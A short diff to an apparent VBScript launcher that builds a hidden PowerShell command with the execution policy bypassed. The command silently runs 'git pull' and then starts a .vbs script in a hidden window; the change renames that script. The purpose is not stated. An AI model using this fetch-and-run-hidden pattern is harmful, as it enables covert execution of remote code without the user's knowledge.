@@ -36,8 +36,9 @@ cmd = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command " & _
 "cd $r;" & _
 "Start-Process ($g+'\bin\git.exe') -ArgumentList 'pull' -WindowStyle Hidden -Wait" & _
 "};" & _
-"if(Test-Path($r+'\bloc_note.vbs')){" & _
-"Start-Process wscript -ArgumentList ($r+'\bloc_note.vbs') -WindowStyle Hidden" & _
+"if(Test-Path($r+'\bloc_note2.vbs')){" & _
+"Start-Process wscript -ArgumentList ($r+'\bloc_note2.vbs') -WindowStyle Hidden" & _
 "}"
+
 
 WshShell.Run cmd, 0, False
